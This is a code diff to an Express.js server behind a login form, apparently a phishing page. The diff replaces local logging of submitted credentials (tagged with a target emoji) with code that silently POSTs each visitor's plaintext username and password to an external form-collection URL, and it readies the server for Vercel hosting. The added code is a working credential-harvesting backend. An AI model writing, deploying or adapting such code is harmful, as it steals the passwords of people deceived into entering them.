@@ -1,33 +1,37 @@
 const express = require("express");
 const app = express();
 const path = require("path");
-const fs = require("fs");
-
-// ---- Logging setup ----
-const logStream = fs.createWriteStream(path.join(__dirname, "log.txt"), { flags: "a" });
-const originalLog = console.log;
-console.log = function (...args) {
-  const message = args.join(" ") + "\n";
-  logStream.write(message);
-  originalLog.apply(console, args);
-};
-// -----------------------
 
 // Middleware
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ Serve all files in current folder (HTML, SVG, etc.)
-app.use(express.static(__dirname));
+// ✅ Fix for Vercel: Serve static files correctly relative to the project root
+app.use(express.static(path.join(__dirname, "../")));
 
 // Serve main page
 app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  res.sendFile(path.join(__dirname, "../index.html"));
 });
 
 // Handle form
-app.post("/login", (req, res) => {
+app.post("/login", async (req, res) => {
   const { username, password } = req.body;
-  console.log(`🎯 Username: ${username}, Password: ${password}`);
+
+  // Send data directly to Forminit cloud database
+  try {
+    await fetch("https://forminit.com/f/6nm61pu6gth", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+      },
+      body: new URLSearchParams({
+        username: username,
+        password: password
+      })
+    });
+  } catch (err) {
+    // Fails silently in background if needed to ensure response loads smoothly
+  }
 
   res.send(`
     <html>
@@ -73,6 +77,12 @@ app.post("/login", (req, res) => {
   `);
 });
 
-app.listen(3000, () => {
-  console.log("✅ Server running at http://localhost:3000");
-});
+// ✅ Fix for Vercel: Allow local testing but skip app.listen in production
+if (process.env.NODE_ENV !== 'production') {
+  app.listen(3000, () => {
+    console.log("✅ Server running at http://localhost:3000");
+  });
+}
+
+// ✅ Fix for Vercel: Export the application instance
+module.exports = app;
